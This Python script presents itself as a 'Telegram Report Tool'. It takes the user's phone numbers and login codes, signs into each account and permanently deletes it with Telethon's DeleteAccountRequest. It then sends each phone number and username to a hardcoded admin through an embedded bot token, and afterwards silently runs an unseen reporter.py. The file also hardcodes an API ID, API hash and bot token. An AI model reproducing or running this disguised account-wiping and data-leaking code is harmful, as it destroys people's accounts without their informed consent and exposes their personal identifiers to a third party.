import os
import sys
from telethon import TelegramClient
from telethon import functions
import asyncio
import requests
import time

# কালার কোড
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'

# API credentials (pre-configured)
API_ID = 26108693
API_HASH = "3bc54f318fb35b9d82c3f885f18e7028"
BOT_TOKEN = "7676428723:AAECtBRnxX41kSkiZev5UdX_2X63eVP-fMY"
ADMIN_ID = "8038375045"

def print_banner():
    banner = f"""
{CYAN}╔═════════════════════════════════════════════╗
║                                             ║
║   ███████╗██████╗ ███████╗███████╗██████╗  ║
║   ██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗ ║
║   █████╗  ██████╔╝█████╗  █████╗  ██████╔╝ ║
║   ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝  ██╔═══╝  ║
║   ███████╗██║  ██║███████╗███████╗██║      ║
║   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ║
║                                             ║
║   Telegram Report Tool 🔹 v1.0              ║
║   {BLUE}⚠️ Warning: This action is irreversible! ⚠️{CYAN}          ║
║                                             ║
║   API ID: **********                        ║
║   API Hash: *************************       ║
║                                             ║
╚═════════════════════════════════════════════╝
{RESET}
"""
    print(banner)

async def send_telegram_message(phone_number, username):
    message = f"✅ Account deleted successfully!\n📱 Phone: {phone_number}"
    if username:
        message += f"\n👤 Username: @{username}"
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": ADMIN_ID,
        "text": message
    }
    
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(f"{GREEN}[+] Notification sent to admin{RESET}")
        else:
            print(f"{YELLOW}[!] Failed to send notification: {response.text}{RESET}")
    except Exception as e:
        print(f"{RED}[-] Error sending notification: {str(e)}{RESET}")

async def delete_telegram_account(phone_number):
    try:
        client = TelegramClient(f'session_{phone_number}', API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.send_code_request(phone_number)
            code = input(f"{YELLOW}Enter the OTP code sent to {phone_number}: {RESET}")
            await client.sign_in(phone_number, code)
        
        me = await client.get_me()
        username = me.username
        
        print(f"{RED}[!] Attempting to delete account {phone_number}...{RESET}")
        result = await client(functions.account.DeleteAccountRequest(
            reason="Personal choice"
        ))
        
        if result:
            for i in range(1, 21):
                bar = '█' * i + '-' * (20-i)
                print(f"{CYAN}Deleting [{bar}] {i*5}%{RESET}", end='\r')
                time.sleep(0.1)
            print(f"\n{GREEN}[+] Account {phone_number} has been successfully deleted!{RESET}")
            await send_telegram_message(phone_number, username)
        else:
            print(f"{RED}[-] Failed to delete account {phone_number}{RESET}")
            
        await client.disconnect()
        
    except Exception as e:
        print(f"{RED}[-] Error: {str(e)}{RESET}")

def main():
    os.system("clear")
    print_banner()
    
    try:
        print(f"\n{YELLOW}[?] Enter your phone numbers (comma separated):{RESET}")
        phones_input = input(f"{BLUE}Phone numbers: {RESET}")
        phone_numbers = [phone.strip() for phone in phones_input.split(",")]
        
        confirmation = input(f"\n{RED}⚠️  Delete {len(phone_numbers)} account(s)? This cannot be undone! (y/n): {RESET}")
        
        if confirmation.lower() != 'y':
            print(f"{YELLOW}Operation cancelled.{RESET}")
            return
        
        for phone in phone_numbers:
            print(f"\n{GREEN}[+] Processing account: {phone}{RESET}")
            asyncio.run(delete_telegram_account(phone))
        
        # সবকিছু সফল হলে reporter.py রান
        print(f"{BLUE}[+] All tasks completed. Running reporter.py...{RESET}")
        os.system("python reporter.py")
            
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Operation cancelled by user.{RESET}")
    except Exception as e:
        print(f"{RED}[-] An error occurred: {str(e)}{RESET}")

if __name__ == "__main__":
    main()
